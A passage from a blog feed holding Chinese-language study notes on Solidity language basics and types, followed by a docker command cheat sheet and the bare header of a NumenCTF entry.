class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数function">函数（function）</h2><p>函数是代码的可执行单位。通常在合约内定义函数，但它们也可以被定义在合约之外。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.7.1 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // 函数</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义在合约之外的辅助函数</span><br><span class="line">function helper(uint x) pure returns (uint) &#123;</span><br><span class="line">    return x * 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数修饰器modifier">函数修饰器（modifier）</h2><p>函数修饰器可以被用来以声明的方式修改函数的语义</p><p>具有同一个modifier的名字但参数不同是不可能的；但是modifier可以被重载/覆写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.22 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // 修饰器</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public view onlySeller &#123; // 修饰器的使用</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件event">事件（event）</h2><p>事件是能方便地调用以太坊虚拟机日志功能的接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.21 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // 事件</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // 触发事件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="错误error">错误（error ）</h2><p>error为失败情况定义描述性的名称和数据，可以在回滚（revert等）中使用。与字符串相比，error要便宜的多（消耗的gas少），并允许对额外的数据进行编码。可以使用NatSpec 格式来向用户描述错误。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 没有足够的资金用于转账。要求 `requested`。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 但只有 `available` 可用。</span></span><br><span class="line"><span class="function">error <span class="title">NotEnoughFunds</span>(<span class="params"><span class="built_in">uint</span> requested, <span class="built_in">uint</span> available</span>)</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; <span class="built_in">uint</span>) balances;</span><br><span class="line">    <span class="function">function <span class="title">transfer</span>(<span class="params">address to, <span class="built_in">uint</span> amount</span>) <span class="keyword">public</span></span> &#123;</span><br><span class="line">        <span class="built_in">uint</span> balance = balances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span> (balance &lt; amount)</span><br><span class="line">            <span class="function">revert <span class="title">NotEnoughFunds</span>(<span class="params">amount, balance</span>)</span>; <span class="comment">//回滚 error</span></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结构类型struct">结构类型（struct）</h2><p>结构类型是可以将几个变量分组的自定义类型，和c语言一样的</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"><span class="keyword">pragma</span> solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    <span class="keyword">struct</span> Voter &#123; <span class="comment">// 结构</span></span><br><span class="line">        <span class="built_in">uint</span> weight;</span><br><span class="line">        <span class="built_in">bool</span> voted;</span><br><span class="line">        address <span class="built_in">delegate</span>;</span><br><span class="line">        <span class="built_in">uint</span> vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举类型enum">枚举类型（enum）</h2><p>enum可用来创建由一定数量的'常量值'构成的自定义类型</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> SPDX-License-Identifier: GPL-<span class="number">3.0</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.4</span>.<span class="number">0</span> &lt;<span class="number">0.9</span>.<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; <span class="regexp">//</span> 枚举</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类型">类型</h1><h2 id="值类型">值类型</h2><p>以下类型也称为值类型，因为这些类型的变量将始终按值来传递。也就是说，当这些变量被用作函数参数或者用在赋值语句中时，总会进行值拷贝。</p><h3 id="布尔类型">布尔类型</h3><p><code>bool</code> ：可能的取值为字面常数值 <code>true</code> 和<code>false</code></p><p>运算符：</p><ul><li><code>!</code> （逻辑非）</li><li><code>&amp;&amp;</code> （逻辑与， "and" ）</li><li><code>||</code> （逻辑或， "or" ）</li><li><code>==</code> （等于）</li><li><code>!=</code> （不等于）</li></ul><p>其中与和或都遵循短路原则</p><h3 id="整型">整型</h3><p><code>int</code> / <code>uint</code>：分别表示有符号和无符号的不同位数的整型变量。 支持关键字<code>uint8</code> 到 <code>uint256</code> （无符号，从 8 位到 256位）以及 <code>int8</code> 到 <code>int256</code>，以 <code>8</code>位为步长递增。 <code>uint</code> 和 <code>int</code> 分别是<code>uint256</code> 和 <code>int256</code> 的别名。</p><p>运算符：</p><ul><li>比较运算符： <code>&lt;=</code> ， <code>&lt;</code> ，<code>==</code> ， <code>!=</code> ， <code>&gt;=</code> ，<code>&gt;</code> （返回布尔值）</li><li>位运算符： <code>&amp;</code> ， <code>|</code> ， <code>^</code>（异或）， <code>~</code> （位取反）</li><li>算数运算符： <code>+</code> ， <code>-</code> ， 一元运算<code>-</code> （仅针对有符号整数）， <code>*</code> ， <code>/</code>， <code>%</code> （取余） ， <code>**</code> （幂），<code>&lt;&lt;</code> （左移位） ， <code>&gt;&gt;</code>（右移位）</li></ul><p>对于一个整数类型X，你可以使用type(X).min和type(X).max来访问该类型可表示的最小和最大值。</p><h3 id="位操作">位操作</h3><p>位操作是在数字的补码进行的。这意味着，例如<code>~int256(0) == int256(-1)</code></p><h3 id="移位">移位</h3><p>移位操作的结果将截断成左操作数的类型；右操作数必须是无符号类型，否则会产生编译错误。</p><ul><li><p><code>x &lt;&lt; y</code> 等价于<code>x * 2**y</code>.</p></li><li><p><code>x &gt;&gt; y</code>等价于<code>x / 2**y</code>，向负无穷取整</p></li><li><p>在<code>0.5.0</code>版本之前，负数x的右移<code>x&gt;&gt;y</code>相当于数学表达式<code>x/2**y</code>向零舍入，即右移使用向上取整（向零）而不是向下取整（向负无穷）。</p></li></ul><p>ps：对移位操作从不进行溢出检查，就像对算术操作那样。相反，结果总是被截断的。</p><h3 id="加减乘">加减乘</h3><p>加法、减法和乘法具有通常的语义，在溢出和下溢方面有两种不同的模式：</p><p>默认情况下，所有的算术都会被检查是否有下溢，但这可以通过unchecked块来禁用，从而导致包装算术。更多的细节可以在该部分找到。</p><p>表达式-x相当于（T(0) -x），其中T是x的类型。如果x是负的，-x的值可以是正的。还有一个注意事项也是由补码引起的：</p><p><code>如果你有int x = type(int).min;，那么-x就不符合正的范围。这意味着未经检查的&#123; assert(-x == x); &#125;是有效的，而表达式-x在检查模式下使用时将导致一个失败的断言。</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    int256 public a;</span><br><span class="line">    int256 public b;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        a = type(int256).min;</span><br><span class="line">        unchecked&#123;</span><br><span class="line">            b = -a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function compare() public view returns(bool) &#123;</span><br><span class="line">        bool jdg = (a==b);</span><br><span class="line">        return jdg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/image-20230517153400833.png" alt="image-20230517153400833"></p><h3 id="除">除</h3><p>由于运算结果的类型总是操作数之一的类型，整数除法的结果总是一个整数。在Solidity中，除法是向零进位的。这意味着<code>int256(-5) / int256(2) == int256(-2)</code>。</p><p>请注意，与此相反，在字面量（literals）上除法的结果是任意精度的小数值。</p><p>除以0为导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p><p><code>type(int).min / (-1)</code>这个表达式是除法导致上溢的唯一情况</p><h3 id="模">模</h3><p>模操作<code>a % n</code>产生操作数<code>a</code>除以操作数<code>n</code>后的余数<code>r</code>，其中<code>q = int(a / n)，r = a - (n * q)</code>。这意味着模运算的结果与它的左边操作数（或零）相同，<code>a % n == -(-a % n)</code>对负数<code>a</code>成立：</p><ul><li><code>int256(5) % int256(2) == int256(1)</code></li><li><code>int256(5) % int256(-2) == int256(1)</code></li><li><code>int256(-5) % int256(2) == int256(-1)</code></li><li><code>int256(-5) % int256(-2) == int256(-1)</code></li></ul><p>模0会导致报错，并且不能使用<code>unchecked&#123;&#125;</code>来禁用。</p><h3 id="幂">幂</h3><p>建议用<code>x*x*x</code>来代替<code>x**3</code>来减少gas消耗</p><p>EVM定义<code>0**0=1</code></p><h3 id="地址">地址</h3><p>地址有两种：</p><ul><li><p><code>address</code>:保存一个20字节的值（以太坊地址的大小）。</p></li><li><p><code>address payable</code>:与<code>address</code>相同，但有额外的方法<code>transfer</code>和<code>send</code>。</p><p><code>payable address</code>到<code>address</code>是可以隐式转换的，但<code>address</code>到<code>payable address</code>必须通过显式转换：<code>payable(&lt;address&gt;)</code></p><p><code>uint160</code>，整数字面量、<code>bytes20</code>和合约类型都可以和<code>address</code>进行显式转换</p><p>只有<code>address</code>和合约类型可以通过<code>payable</code>转换成<code>address payable</code>。对于一个合约类型，只有它可以接收以太币或存在一个<code>payable fallback function</code>才可以完成转换。注意<code>payable(0)</code>是许可的。</p></li></ul><p>注意：</p><ol type="1"><li>如果你需要一个<code>address</code>类型的变量，并计划向其发送以太币，那么请将其类型声明为<code>payable address</code></li><li><code>address</code>和<code>address payable</code>的区别在<strong>0.5.0</strong>版本中引入的。同样从该版本开始，合约不能隐含地转换为<code>address</code>类型。但如果它们有一个接收或<code>payable fallback function</code>，仍然可以显式地转换为<code>address</code>或<code>address payable</code>。</li></ol><p>如果把一个较大的bytes转换成一个<code>address</code>，例如<code>bytes32</code>，那么<code>address</code>将被截断。例如，<code>b = '0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC'</code>:</p><ul><li><code>address(uint160(bytes20(b))) = 0x111122223333444455556666777788889999aAaa</code></li><li><code>address(uint160(uint256(b))) = 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</code></li></ul><h3 id="地址成员">地址成员</h3><ul><li><p><code>balance</code> 和 <code>transfer</code></p><p>查询某个地址的余额使用balance，向某个payableaddress发送以太币（wei为单位）使用transfer：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address payable x = payable(0x123);</span><br><span class="line">address myAddress = address(this);</span><br><span class="line">if (x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10) x.transfer(10);</span><br></pre></td></tr></table></figure><p>如果x是一个合约地址，它的代码（实际上是接受以太坊的函数，或<code>Fallback</code>函数）会连同<code>transfer</code>一起执行。这是EVM的一个特性，无法被阻止。如果这段执行将gas消耗完或其他原因失败，<code>transfer</code>就会被回退</p></li><li><p><code>send</code></p><p><code>send</code>是低级别的<code>transfer</code>，如果执行失败则会返回<code>false</code>而不是回退</p><p>使用<code>send</code>有一些危险：如果调用堆栈深度为1024，转账就会失败（这可以由调用者强制执行），如果接收者没有<code>gas</code>了，也会失败。因此，为了安全地进行以太币转账，一定要检查<code>send</code>的返回值、使用<code>transfer</code>，甚至更好的是：使用收款人取款的模式</p></li><li><p><code>call</code>, <code>delegatecall</code> 和<code>staticcall</code></p><p>为了与不遵守ABI的合约交互，或者为了更直接地控制编码，我们提供了函数<code>call</code>、<code>delegatecall</code>和<code>staticcall</code>。它们都接受一个字节的内存参数，并返回成功条件（作为一个<code>bool</code>）和返回的数据（字节内存）。函数<code>abi.encode</code>,<code>abi.encodePacked</code>,<code>abi.encodeWithSelector</code>和<code>abi.encodeWithSignature</code>可用于编码结构化数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;);</span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line">require(success);</span><br></pre></td></tr></table></figure><ul><li><p>可以调节gas消耗量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li><li><p>以太币也可以调节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li><li><p>甚至是组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call&#123;gas: 1000000, value: 1 ether&#125;(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;));</span><br></pre></td></tr></table></figure></li></ul><p>同样的，<code>delegatecall</code>也可以被这样使用，但不同的点在于：执行环境为当前合约的环境，目标合约地址只是被调用，<code>delegatecall</code>的目的是为了使用在另一个合约中的库代码</p><p><code>staticcall</code>与<code>call</code>相似，但它会在调用的函数改变状态后<code>revert</code></p><p>所有这三个函数<code>call</code>, <code>delegatecall</code> 和<code>staticcall</code>都是非常低级的函数，只应该作为最后的手段使用，因为它们破坏了Solidity的类型安全。</p><p><code>gas</code>选项在所有三种方法中都免费，而<code>value</code>选项只在<code>call</code>中免费。</p></li><li><p><code>code</code> 和<code>codehash</code></p><p>可以查询任何智能合约的部署代码。使用<code>.code</code>来获取<code>EVM</code>字节码，作为字节内存，它可能是空的。使用<code>.codehash</code>获得该代码的<code>Keccak-256</code>哈希值（作为<code>bytes32</code>）。注意，<code>addr.codehash</code>比使用<code>keccak256(addr.code)</code>更便宜。</p><p>所有的合同都可以转换为<code>address</code>类型，所以可以用<code>address(this).balance</code>查询当前合同的余额。</p></li></ul><h3 id="合约类型">合约类型</h3><p>每个合约都有自己的类型，它可以通过<code>adress(x)</code>显式地转化成<code>address</code>类型；如果合约中存在<code>receive</code>或<code>payable fallback</code>函数，则能转换成<code>payable address</code>类型；否则需要用<code>payable(address(x))</code>来转换。</p><p>注意：在<code>0.5.0</code>版本以前，<code>address</code>和<code>payable address</code>没有区别。</p><p>合约的数据表示与地址类型相同，这种类型也在<code>ABI</code>中使用。</p><p>合约不支持任何操作符。</p><p>合约的成员包括合约的<code>public</code>函数和任何标记<code>public</code>的状态变量。</p><p>对于一个合约<code>c</code>，你可以使用<code>type(c)</code>来访问合同的类型信息。</p><h3 id="定长字节数组">定长字节数组</h3><p><code>bytes1, bytes2, bytes3, ..., bytes32</code>保存一串从1到32的字节。</p><p>操作符：</p><ul><li>比较： <code>&lt;=</code>, <code>&lt;</code>, <code>==</code>,<code>!=</code>, <code>&gt;=</code>, <code>&gt;</code> (评估为bool)</li><li>比特运算符：<code>&amp;</code>, <code>|</code>, <code>^</code>(bit异或), <code>~</code> (比特取反)</li><li>移位运算符：<code>&lt;&lt;</code>（左移），<code>&gt;&gt;</code>（右移）</li><li>索引访问：如果<code>x</code>是<code>bytesI</code>类型的，那么<code>x[k]</code>对于<code>0 &lt;= k &lt; I</code>返回第<code>k</code>个字节（只读）。</li></ul><p>成员：</p><ul><li><code>.length</code> 返回定长数组的长度（只读）</li></ul><p>注意：<code>bytes1[]</code>类型是一个字节数组，但是由于填充规则，它为每个元素浪费了31个字节的空间（除了在存储中）。最好使用<code>bytes</code>类型来代替。</p><p>注意：在<code>0.8.0</code>版本之前，<code>byte</code>曾经是<code>bytes1</code>的别名。</p><h3 id="变长字节数组">变长字节数组</h3><p><code>bytes</code>和<code>string</code></p><h3 id="地址字面量">地址字面量</h3><p>以<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-55.md">EIP-55</a>.为标准，不通过校验将无法成为地址</p><h3 id="有理数和整数字面量">有理数和整数字面量</h3><p>小数点字面量是由<code>.</code>与小数点后的至少一个数字组成。例子包括<code>.1</code>和<code>1.3</code>（但不能是<code>1.</code>）。也支持科学计数法，字面量MeE等价于<code>M*10**E</code>，指数部分必须是整数，尾数可以是小数。</p><p>下划线可用来提高代码可读性，没有其他任何意义。例如，十进制123_000，十六进制0x2eff_abde，科学十进制符号1_2e345_678都是有效的。下划线只允许在两个数字之间，并且只允许一个连续的下划线。</p><p>数字字面表达式保留了任意精度，直到被转换成其他非字面类型（即通过与数字字面表达式以外的其他东西一起使用（如布尔字面）或显式转换）。在数字字面表达式中，计算不会溢出，除法不会截断。例如，<code>2**800+1-2**800</code>在字面量中是允许的。<code>.5*8</code>的结果是整型的<code>4</code>。</p><p>只要操作数是整数，任何可以应用于整数的操作符也可以应用于数字字面表达式。如果两者中的任何一个是小数，则不允许进行位操作，如果指数是小数，则不允许进行指数化（因为这可能导致非有理数）。</p><p>以字面数为左（或基数）操作数，以整数类型为右（指数）操作数的移位和指数化，总是在<code>uint256</code>（对于非负的字面数字）或<code>int256</code>（对于负的字面数字）类型中进行，与右（指数）操作数的类型无关。</p><p>在<code>0.4.0</code>之前，整数的字面量会被截断即<code>5/2=2</code>，之后是<code>2.5</code></p><h3 id="字符字面量和类型">字符字面量和类型</h3><p>字符字面量可以分开写，例如<code>“foo""bar"</code>等价于<code>”foobar"</code>；并且<code>"foo"</code>只占用3个字节而不是4个字节（对比C语言的字符串以<code>"\0"</code>结尾）；它们可以隐式地转换成<code>bytes1</code>,…,<code>bytes32</code>；也可以转换成<code>bytes</code>和<code>string</code>。</p><p>字符字面量只能包含ASCII可打印字符，也就是0x20到0x7E；此外，也包括以下转义符：</p><ul><li><code>\&lt;newline&gt;</code> (转义实际换行)</li><li><code>\\</code> (反斜杠)</li><li><code>\'</code> (单引号)</li><li><code>\"</code> (双引号)</li><li><code>\n</code> (换行符)</li><li><code>\r</code> (回车)</li><li><code>\t</code> (标签 tab)</li><li><code>\xNN</code> (十六进制转义，表示一个十六进制的值，)</li><li><code>\uNNNN</code> (unicode 转义，转换成UTF-8的序列)</li></ul><p>注意：直到0.8.0才推出：<code>\b</code>（退格）、<code>\f</code>（换页）、<code>\v</code>（垂直标签）；但如果实在需要用到，可以通过十六进制转义插入，即分别为<code>\x08</code>、<code>\x0c</code>和<code>\x0b</code>。</p><p>任何unicode行终结符（除了LF，VF，FF，CR，NEL，LS，PS）都可以当成字符串字面常量的终止符。只有当字符串字面常量前没有<code>\</code>时，换行符才能终止字符串字面常量。</p><h3 id="unicode字面量">Unicode字面量</h3><p>Unicode字面量—以<code>unicode</code>开头—可以包含所有有效的UTF-8字符，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string memory a = unicode&quot;Hello 😃&quot;;</span><br></pre></td></tr></table></figure><h3 id="十六进制字面量">十六进制字面量</h3><p>以"hex"开头，紧跟单引号或双引号字符串： <code>hex"001122FF"</code>,<code>hex'0011_22_FF'</code>，可以使用下划线作为字符的分隔符。</p><p>用空格分隔的十六进制字面量将表达成一个拼接起来的十六进制字面量：<code>hex"00112233" hex"44556677"</code>等价于 <code>hex"0011223344556677"</code></p><p>十六进制字面量不能隐式转换成字符字面量</p><h3 id="枚举">枚举</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前做审计的时候都是碰到什么学什么，这样的代价就是基础很差，
要一直搜重复的东西，所以决定好好读一遍&lt;a href=&quot;https://learnblockchain.cn/docs/solidity/&quot;&gt;Solidity 中文文档 —
Solidity中文文档 — 登链社区
(learnblockchain.cn)&lt;/a&gt;，然后再搞别的，预期这个月以内&lt;/p&gt;</summary>
    
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>docker常用命令</title>
    <link href="http://sh1k4ku.github.io/2023/04/18/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://sh1k4ku.github.io/2023/04/18/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2023-04-18T08:02:28.000Z</published>
    <updated>2023-05-03T06:59:06.103Z</updated>
    
    <content type="html"><![CDATA[<p>不想老是搜了</p><span id="more"></span><h1 id="镜像操作">镜像操作</h1><ul><li><p>拉取镜像 <figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker pull image_name</span></span><br></pre></td></tr></table></figure></p></li><li><p>搜索镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search image_name</span></span><br></pre></td></tr></table></figure></li><li><p>镜像列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure></li><li><p>删除镜像</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker rmi image_name</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="容器操作">容器操作</h1><ul><li><p>启动镜像建立容器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> image_name</span><br></pre></td></tr></table></figure><ul><li><p>建立并打开 STDIN，和shell交互</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> image_name</span><br></pre></td></tr></table></figure></li><li><p>挂载文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -v $&quot;pwd&quot;:/share image_name </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker run -it -v <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span>:/home/share christoftorres/osiris</span></span><br></pre></td></tr></table></figure></li><li><p>指定容器名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> <span class="attribute">--name</span>=container_name image_name</span><br></pre></td></tr></table></figure></li></ul></li><li><p>查看容器列表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure></li><li><p>启动容器</p></li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name</span><br></pre></td></tr></table></figure><ul><li><p>启动并交互</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> -i container_name</span><br></pre></td></tr></table></figure></li><li><p>关闭容器</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop container_name</span><br></pre></td></tr></table></figure></li><li><p>重启容器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker restart container_name</span></span><br></pre></td></tr></table></figure></li><li><p>删除容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> container_name</span><br></pre></td></tr></table></figure><ul><li><p>删除指定镜像的所有容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm <span class="constructor">$(<span class="params">docker</span> <span class="params">ps</span> -<span class="params">a</span> | <span class="params">grep</span> <span class="string">&quot;image_name&quot;</span> | <span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $1&#125;&#x27;)</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>文件拷贝</p><ul><li><p>当前目录-&gt;容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> file_name container_name:/file_path</span><br></pre></td></tr></table></figure></li><li><p>容器-&gt;当前目录</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span>  container_name:file_name</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;不想老是搜了&lt;/p&gt;</summary>
    
    
    
    <category term="docker" scheme="http://sh1k4ku.github.io/categories/docker/"/>
    
    
    <category term="docker" scheme="http://sh1k4ku.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>NumenCTF</title>
    <link href="http://sh1k4ku.github.io/2023/04/04/NumenCTF/"/>
    <id>http://sh1k4ku.github.io/2023/04/04/NumenCTF/</id>
    <published>2023-04-04T06:52:52.000Z</published>
    <updated>2023-04-16T15:02:31.108Z</updated>
    
